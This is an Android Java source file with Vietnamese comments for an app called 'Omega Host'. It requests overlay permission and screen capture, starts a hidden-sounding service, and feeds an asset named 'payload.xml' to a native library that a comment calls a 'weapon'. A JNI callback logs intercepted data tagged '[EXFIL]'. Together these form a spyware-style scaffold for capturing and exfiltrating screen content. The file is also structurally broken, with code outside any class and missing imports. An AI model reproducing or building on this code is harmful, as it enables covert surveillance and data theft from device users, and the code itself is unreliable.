package com.omega.host;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import android.os.Handler;
import android.os.Looper;
import java.nio.ByteBuffer;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;

// Trong onCreate():
if (!Settings.canDrawOverlays(this)) {
    startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())));
}

MediaProjectionManager mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
startActivityForResult(mgr.createScreenCaptureIntent(), 9999);

// Override hàm onActivityResult:
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    if (requestCode == 9999 && resultCode == RESULT_OK) {
        Intent serviceIntent = new Intent(this, OpticalPhantomService.class);
        startForegroundService(serviceIntent);
        // Đợi service khởi tạo xong rồi gọi engageOpticalTrap (có thể dùng Handler.postDelayed 1000ms)
    }
}

public class MainActivity extends Activity {

    private TextView tv;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    // Khai báo hàm C++ nhận DirectByteBuffer
    public native void executeVoidProtocol(ByteBuffer buffer, int capacity, MainActivity callback);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        tv = new TextView(this);
        tv.setBackgroundColor(Color.BLACK);
        tv.setTextColor(Color.GREEN);
        tv.setTextSize(14f);
        tv.setPadding(50, 50, 50, 50);
        tv.setGravity(Gravity.START);
        setContentView(tv);
        
        appendLog("[SYSTEM] Booting Omega Host...\n[STATUS] Allocating Off-Heap Memory...");

        new Thread(() -> {
            try {
                System.loadLibrary("omega_core");
                
                // 1. ĐỌC DỮ LIỆU TỪ VÙNG ẨN (ASSETS)
                InputStream is = getAssets().open("payload.xml");
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] chunk = new byte[8192];
                int len;
                while ((len = is.read(chunk)) != -1) baos.write(chunk, 0, len);
                is.close();
                byte[] rawBytes = baos.toByteArray();

                // 2. CẤP PHÁT DIRECT BYTE BUFFER (NATIVE HEAP - BỎ QUA GARBAGE COLLECTOR)
                ByteBuffer directBuffer = ByteBuffer.allocateDirect(rawBytes.length);
                directBuffer.put(rawBytes);
                directBuffer.rewind();

                appendLog("[SYNC] DirectBuffer mapped. Handing over to C++ SWAR...\n");
                
                // 3. KÍCH HOẠT VŨ KHÍ C++
                executeVoidProtocol(directBuffer, rawBytes.length, this);
                
                appendLog("\n[SUCCESS] OMEGA HOST: STREAM TERMINATED.");

            } catch (Exception e) {
                appendLog("[CRITICAL] " + e.getMessage());
            }
        }).start();
    }

    // HÀM ĐƯỢC C++ GỌI NGƯỢC LẠI (JNI CALLBACK)
    public void onIntercept(String data) {
        mainHandler.post(() -> appendLog("[EXFIL] >>> " + data));
    }

    private void appendLog(String msg) {
        tv.append(msg + "\n");
    }
}